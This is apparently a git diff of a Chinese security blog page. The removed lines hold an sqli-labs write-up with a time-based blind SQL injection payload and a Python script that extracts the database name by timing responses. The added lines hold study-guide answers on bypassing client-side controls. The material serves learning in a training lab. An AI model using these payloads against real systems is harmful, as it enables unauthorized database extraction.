-<p><a href="http://localhost/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-8/?id=1&#39;</a> and if(ascii(substr((select database()),1,1))=115,sleep(5),null) %23  正确，sleep了5秒<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">基于时间的盲注脚本，可以在布尔盲注的基础上修改来获取完整的内容，我这里就先写了爆出数据库名，风格大体相同，做了点小改动：</span><br></pre></td></tr></table></figure></p>
-<h1 id="coding-utf-8-1"><a href="#coding-utf-8-1" class="headerlink" title="coding=utf-8"></a>coding=utf-8</h1><p>import requests<br>import urllib<br>import time</p>
-<p>url = “<a href="http://localhost/sqli-labs/Less-9/?id=1&quot;" target="_blank" rel="noopener">http://localhost/sqli-labs/Less-9/?id=1&quot;</a><br>database = “database()”<br>lengthdatabase = “‘ and if((length({0})&gt;={1}),sleep(5),null) #”<br>getDBName = “‘ and if(ascii(substr(({0}),{1},1))&gt;={2},sleep(5),null) #”</p>
-<p>def LengthString(payload, string):<br>    left = 0<br>    right = 0<br>    guess = 10<br>    while 1:<br>        if LengthResult(payload, string, guess):<br>            guess += 5<br>        else:<br>            right = guess<br>            break</p>
-<pre><code>mid = (left + right) / 2
-while left &lt; right - 1:
-    if LengthResult(payload, string, mid):
-        left = mid
-    else:
-        right = mid
-    mid = (left + right) / 2
-
-return left
-</code></pre><p>def LengthResult(payload, string, length):<br>    Finalurl = url + urllib.quote(payload.format(string, length))</p>
-<pre><code># Finalurl = url + urllib.quote(payload % (string, pos, ascii))
-# print Finalurl
-startTime = time.time()
-response = requests.get(Finalurl)
-if time.time() - startTime &gt;= 5:
-    return True
-else:
-    return False
-</code></pre><p>def getName(payload, string, length):<br>    tmp = ‘’<br>    for i in xrange(1, length + 1):<br>        left = 96<br>        right = 126<br>        mid = (left + right) / 2<br>        while left &lt; right - 1:<br>            if getNameResult(payload, string, i, mid):<br>                left = mid<br>            else:<br>                right = mid<br>            mid = (left + right) / 2<br>        tmp += chr(mid)<br>        print tmp<br>    return tmp</p>
-<p>def getNameResult(payload, string, pos, ascii):<br>    Finalurl = url + urllib.quote(payload.format(string, pos, ascii))</p>
-<pre><code># print Finalurl
-startTime = time.time()
-response = requests.get(Finalurl)
-if time.time() - startTime &gt;= 5:
-    return True
-else:
-    return False
-</code></pre><p>if <strong>name</strong> == ‘<strong>main</strong>‘:<br>    getDBLength = LengthString(lengthdatabase, database)<br>    print “The current DBlength:” + str(getDBLength)<br>    DBName = getName(getDBName, database, getDBLength)<br>    print “The current DBName:” + DBName<br><code>`</code></p>
-<p>运行脚本得到数据库名结果：  </p>
-<p><img src="https://note.youdao.com/yws/public/resource/d16f71bd0704844f19a2e1165db52575/xmlnote/5FBEAEECACA143C8A03B0206CB86FF7A/6223" alt="">  </p>
-<h3 id="less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注"><a href="#less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注" class="headerlink" title="less 10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)"></a>less 10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)</h3><p>把上面的改成双引号就行</p>
+(3) 主应用程序可在请求的一个隐藏字段中设置一个身份验证令牌。诊断功能能够确认这一点，证实用户在主应用程序中有一个会话。  
+</code></pre><blockquote>
+<p>(1) 攻击者可以将Referer消息头设置为任意值，因此它不是执行任何访问控制检查的安全方法。  </p>
+</blockquote>
+<blockquote>
+<p>(2) 这种方法仅在包含诊断功能的Web服务器为源Web服务器的父域或子域，且对会话cookie进行了相应地审查时有效，否则cookie将不会被提交到诊断服务器。将需要为诊断服务器实施后端机制，以确认随源服务器一起提交的令牌。  </p>
+</blockquote>
+<blockquote>
+<p>(3) 无论诊断服务器的域名是什么，这种方法都有效。只要身份验证令牌不可预测，并且以安全方式传输（请参阅第7章），这种方法就是安全的。此外，还需要实施用于验证令牌的后端机制。  </p>
+</blockquote>
+<h4 id="4-如果一个表单字段的属性为disabled-true，那么它就不会和表单的其他内容一起提交。如何才能改变这种情况呢？"><a href="#4-如果一个表单字段的属性为disabled-true，那么它就不会和表单的其他内容一起提交。如何才能改变这种情况呢？" class="headerlink" title="4.如果一个表单字段的属性为disabled=true，那么它就不会和表单的其他内容一起提交。如何才能改变这种情况呢？"></a>4.如果一个表单字段的属性为disabled=true，那么它就不会和表单的其他内容一起提交。如何才能改变这种情况呢？</h4><blockquote>
+<p>有两种基本的方法：  </p>
+</blockquote>
+<blockquote>
+<p>(1) 可以拦截提交表单的请求，并添加被禁用的参数。  </p>
+</blockquote>
+<blockquote>
+<p>(2) 可以拦截包含表单的响应，并删除disabled=true属性。</p>
+</blockquote>
+<h4 id="5-应用程序可采取什么方法确保客户端执行了输入确认？"><a href="#5-应用程序可采取什么方法确保客户端执行了输入确认？" class="headerlink" title="5.应用程序可采取什么方法确保客户端执行了输入确认？"></a>5.应用程序可采取什么方法确保客户端执行了输入确认？</h4><blockquote>
+<p>应用程序没有办法可以确保客户端执行了输入确认。在客户端上执行的各种操作完全由用户控制。</p>
+</blockquote>
 
       
     </div>
@@ -529,7 +391,7 @@ else:
         <p><span>本文标题:</span><a href="/2018/11/26/sqli-lab(1-10)/"></a></p>
         <p><span>文章作者:</span><a href="/" title="访问 Star_Cheng 的个人博客">Star_Cheng</a></p>
         <p><span>发布时间:</span>2018年11月26日 - 16时33分</p>
-        <p><span>最后更新:</span>2018年07月30日 - 14时03分</p>
+        <p><span>最后更新:</span>2018年11月26日 - 16时51分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2018/11/26/sqli-lab(1-10)/" title="">http://yoursite.com/2018/11/26/sqli-lab(1-10)/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2018/11/26/sqli-lab(1-10)/　　作者: Star_Cheng" title=""></span>
@@ -566,8 +428,8 @@ else:
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-level-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><span class="toc-number">1.</span> <span class="toc-text">1.level-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入"><span class="toc-number">2.</span> <span class="toc-text">2.less-2 GET - Error based - Intiger based (基于错误的GET整型注入)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><span class="toc-number">3.</span> <span class="toc-text">3.less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#coding-utf-8"><span class="toc-number"></span> <span class="toc-text">coding=utf-8</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#coding-utf-8-1"><span class="toc-number"></span> <span class="toc-text">coding=utf-8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#less-10-GET-Blind-Time-based-double-quotes-基于时间的双引号盲注"><span class="toc-number">1.</span> <span class="toc-text">less 10 GET - Blind - Time based - double quotes (基于时间的双引号盲注)</span></a></li></ol>
-</li></div>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#第2章：核心防御机制"><span class="toc-number">1.</span> <span class="toc-text">第2章：核心防御机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-为什么说应用程序处理用户访问的机制是所有机制中最薄弱的机制？"><span class="toc-number">1.1.</span> <span class="toc-text">1.为什么说应用程序处理用户访问的机制是所有机制中最薄弱的机制？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-会话与会话令牌有何不同？"><span class="toc-number">1.2.</span> <span class="toc-text">2.会话与会话令牌有何不同？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-为何不可能始终使用基于白名单的方法进行输入确认？"><span class="toc-number">1.3.</span> <span class="toc-text">3.为何不可能始终使用基于白名单的方法进行输入确认？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-攻击者正在攻击一个执行管理功能的应用程序，并且不具有使用这项功能的任何有效证书。为何他仍然应当密切关注这项功能呢？"><span class="toc-number">1.4.</span> <span class="toc-text">4.攻击者正在攻击一个执行管理功能的应用程序，并且不具有使用这项功能的任何有效证书。为何他仍然应当密切关注这项功能呢？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-旨在阻止跨站点脚本攻击的输入确认机制按以下顺序处理一个输入："><span class="toc-number">1.5.</span> <span class="toc-text">5.旨在阻止跨站点脚本攻击的输入确认机制按以下顺序处理一个输入：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第3章：Web应用程序技术"><span class="toc-number">2.</span> <span class="toc-text">第3章：Web应用程序技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-OPTIONS方法有什么作用？"><span class="toc-number">2.1.</span> <span class="toc-text">1.OPTIONS方法有什么作用？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-If-Modified-Since和If-None-Match消息头的作用是什么？它们为何引起攻击者的兴趣？"><span class="toc-number">2.2.</span> <span class="toc-text">2.If-Modified-Since和If-None-Match消息头的作用是什么？它们为何引起攻击者的兴趣？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-当服务器设置cookie时，secure标签有什么意义？"><span class="toc-number">2.3.</span> <span class="toc-text">3.当服务器设置cookie时，secure标签有什么意义？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-常用状态码301与302有什么不同？"><span class="toc-number">2.4.</span> <span class="toc-text">4.常用状态码301与302有什么不同？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-使用SSL时，浏览器如何与Web代理实现互操作？"><span class="toc-number">2.5.</span> <span class="toc-text">5.使用SSL时，浏览器如何与Web代理实现互操作？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第4章：解析应用程序"><span class="toc-number">3.</span> <span class="toc-text">第4章：解析应用程序</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-当解析一个应用程序时，会遇到以下URL："><span class="toc-number">3.1.</span> <span class="toc-text">1.当解析一个应用程序时，会遇到以下URL：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-如果所针对的应用程序是一个Web论坛，并且只发现了一个URL：http-wahh-app-com-forums-ucp-php-mode-register如何通过它获得论坛成员列表？"><span class="toc-number">3.2.</span> <span class="toc-text">2.如果所针对的应用程序是一个Web论坛，并且只发现了一个URL：http://wahh-app.com/forums/ucp.php?mode=register如何通过它获得论坛成员列表？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-当解析一个应用程序时，遇到以下URL：https-wahh-app-com-public-profile-Address-asp-action-view-amp-location-default-据此推断服务器端应使用何种技术。可能还存在哪些其他内容和功能？"><span class="toc-number">3.3.</span> <span class="toc-text">3.当解析一个应用程序时，遇到以下URL：https://wahh-app.com/public/profile/Address.asp?action=view&amp;location=default 据此推断服务器端应使用何种技术。可能还存在哪些其他内容和功能？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-Web服务器的一个响应包含以下消息头：Server-Apache-Coyote-1-1-这表示服务器使用何种技术？"><span class="toc-number">3.4.</span> <span class="toc-text">4.Web服务器的一个响应包含以下消息头：Server:Apache-Coyote/1.1,这表示服务器使用何种技术？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-假设正在解析两个不同的Web应用程序，在每个应用程序中请求URL-admin-cpf。每个请求返回的响应消息头如下所示。仅由这些消息头能否确定每个应用程序中存在被请求的资源？"><span class="toc-number">3.5.</span> <span class="toc-text">5.假设正在解析两个不同的Web应用程序，在每个应用程序中请求URL /admin.cpf。每个请求返回的响应消息头如下所示。仅由这些消息头能否确定每个应用程序中存在被请求的资源？</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#第5章：避开客户端控件"><span class="toc-number">4.</span> <span class="toc-text">第5章：避开客户端控件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-通过客户端传送的数据如何阻止破坏性攻击？"><span class="toc-number">4.1.</span> <span class="toc-text">1.通过客户端传送的数据如何阻止破坏性攻击？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-应用程序开发者希望阻止攻击者对登录功能发动蛮力攻击。由于攻击者可能以多个用户名为目标，开发者决定将登录尝试失败次数保存在一个加密cookie中，阻止任何失败次数超过5次的请求。有什么办法能够避开这种防御？"><span class="toc-number">4.2.</span> <span class="toc-text">2.应用程序开发者希望阻止攻击者对登录功能发动蛮力攻击。由于攻击者可能以多个用户名为目标，开发者决定将登录尝试失败次数保存在一个加密cookie中，阻止任何失败次数超过5次的请求。有什么办法能够避开这种防御？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-某应用程序包含一个执行严格访问控件的管理页面。该页面上有一个连接到另一台Web服务器的诊断功能链接。只有管理员才能够访问这些功能。不执行另一种验证机制，下列哪一种（如果有）客户端机制可用于为诊断功能提供安全的访问控件？要选择一个解决方案，是否还需要了解其他信息？"><span class="toc-number">4.3.</span> <span class="toc-text">3.某应用程序包含一个执行严格访问控件的管理页面。该页面上有一个连接到另一台Web服务器的诊断功能链接。只有管理员才能够访问这些功能。不执行另一种验证机制，下列哪一种（如果有）客户端机制可用于为诊断功能提供安全的访问控件？要选择一个解决方案，是否还需要了解其他信息？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-如果一个表单字段的属性为disabled-true，那么它就不会和表单的其他内容一起提交。如何才能改变这种情况呢？"><span class="toc-number">4.4.</span> <span class="toc-text">4.如果一个表单字段的属性为disabled=true，那么它就不会和表单的其他内容一起提交。如何才能改变这种情况呢？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-应用程序可采取什么方法确保客户端执行了输入确认？"><span class="toc-number">4.5.</span> <span class="toc-text">5.应用程序可采取什么方法确保客户端执行了输入确认？</span></a></li></ol></li></ol>
+</div>
 <style>
     .left-col .switch-btn {
         display: none;
